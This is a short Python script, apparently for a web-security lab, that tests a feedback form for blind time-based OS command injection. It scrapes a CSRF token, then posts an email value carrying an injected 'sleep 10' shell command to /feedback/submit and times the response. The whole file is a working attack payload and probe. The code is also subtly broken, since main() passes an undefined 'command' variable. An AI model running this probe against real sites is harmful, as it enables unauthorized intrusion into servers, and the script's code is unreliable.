import requests
import urllib3
from bs4 import BeautifulSoup
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def getCSRF(s,url):
    path='/feedback'
    r=s.get(url+path,verify=False,proxies=proxies)
    soup=BeautifulSoup(r.text,'html.parser')
    csrf=soup.find("input")['value']
    return csrf

def inject(url,command,s):
    csrfToken=getCSRF(s,url)
    path="/feedback/submit"
    command="test@gmail.com & sleep 10 #"
    params={'csrf':f'{csrfToken}','name':'test','email':f'{command}','subject':'test','message':'test'}

    response=s.post(url+path,data=params,verify=False,proxies=proxies)

    if(response.elapsed.total_seconds()>=10):
        print("The Parameter is Vulnerable to Blind Time Based Command Injection")

    else:
        print("Not Vulnerable ! ")

def main():
    url=input("Enter the URL Here : ")
    # command=input("Enter the command Here : ")

    s=requests.session()
    inject(url,command,s)


if __name__=="__main__":
    main()